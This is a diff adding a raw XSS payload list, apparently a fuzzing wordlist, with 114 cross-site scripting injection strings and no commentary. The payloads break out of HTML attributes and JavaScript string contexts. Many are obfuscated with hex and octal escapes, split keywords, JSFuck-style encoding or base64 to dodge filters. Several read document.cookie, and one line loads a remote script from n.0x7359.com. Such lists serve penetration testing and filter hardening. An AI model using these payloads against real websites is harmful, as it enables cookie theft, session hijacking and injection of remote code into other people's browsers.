@@ -1,0 +1,114 @@
+'><script>alert(123)</script>
+'><script>alert(123);</script x='
+'`"//><script>alert(1)</script>
+'"><script>alert(2);</script>
+'>  <script>alert(2);</script>
+'>'+'><script>alert(2);</script>
+'>👽💻🔥<script>alert(2);</script>
+'>'><SCript>alert(2);</script>
+'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--
+'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>
+'javaScriPt:alert\x2845\x29'
+'JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]
+'"/><img src= x onerror='alert(document.domain)'>
+'--><img src=x onerror=prompt(document.domain);><!--
+'"/><img src= x onerror=prompt(/xss/)>
+'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+')}, 1000); alert('xss')://
+')}, 1000);alert("xss");//
+'1/-alert\5023\51/';
+'%26%26'javascript:alert%25281%2529//
+'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E'
+%27%3E%27%3E%22%3E%script%3Ealert(2);%3C/script%3E
+%27%3E'><script>alert(2);</script>
+'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
+'"><A HRef=" AutoFocus OnFocus=top/**/?.'ale'%2B'rt'>"
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
+'-alert(0)-'
+');alert(1)//
+'-alert(1)-'
+'-alert(1)//
+'|alert(1)|'
+\'-alert(1)//
+';alert(123);t='
+'alert(1)'.replace(/.+/,eval)
+'>alert(1)</script><script/1='
+');alert(document.cookie)();//
+';alert(document.cookie)//
+'});alert(document.cookie);//'
+';alert(document.domain)//
+';alert("ibrahimxss");//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
+';a=prompt,a()//
+'+ '</b><script>alert(document.cookie)</script><b><!--'
+'`"><*chr*script>log(*num*)</script>
+');confirm(1);//
+'-confirm(1)-
+\');confirm(1);//
+'+confirm(9)&&null=='
+'-confirm(document.cookie)-'
+'-confirm(document.domain)-'
+'confirm(document.domain)'>
+';confirm(String.fromCharCode(88,83,83))//';confirm(String.fromCharCode(88,83,83))//";
+'">><div><meter onmouseover="alert(1)"</div>"
+';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//
+'() {'document.createElement('img').src='javascript:while(1){}'
+'-[document.domain].map(alert)-'
+',document.location='javascript:document.domain','
+'-eval("window['pro'%2B'mpt'](8)")-'
+';frames['\141\154\145\162\164']('\130\123\123');//
+';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
+';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
+';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
+';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
+'href=javascript:alert()>click me<a/y='
+'>&lt;/b&gt;%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cb&gt;&lt;!--
+'>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--
+'">><marquee><h1>1</h1></marquee>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+'>'\n><script>alert(2);</script>
+' onerror='alert("xss")'>
+' onfocus='alert(1)'
+'onfocus='alert(1)' autofocus='
+'onload=alert(1)><svg/1='
+';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
+';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
+';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
+'*prompt(1)*'
+'?prompt`1`?'
+'></script><svg/onload=alert(document.cookie)>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
+';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
+';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+'-setTimeout`prompt\u0028document.domain\u0029`-'
+'><!--"/><style>@import 'data:text/css;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKSk=';</style><b><!--
+'<'s'v'g' o'n'l'o'a'd'='a'l'e'r't'('7')' '>'
+'te' / alert('/') / 'xt';
+';this['\141\154\145\162\164']('\130\123\123');//
+';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
+';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
+';top['\141\154\145\162\164']('\130\123\123');//
+'\u0029\u0028};alert(document.cookie);//"
+'\u003e\'</b><script>alert(document.cookie)</script><b><!--'
+'\u003E'\u0022><script>alert(2);</script>
+';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
+';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
+';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+'x'%20onclick='confirm`1`'
+'x'%2520onclick='confirm%601%60'
+'`"><\x3Cscript>javascript:alert(1)</script>
+'&#x3E;'>"><script>alert(2);</script>
+'&#x3E;'><script>alert(2);</script>
+'; x=eval; </script> <svg onpointerenter=alert()%20z= alert >
+'';!--"<XSS>=&{()}
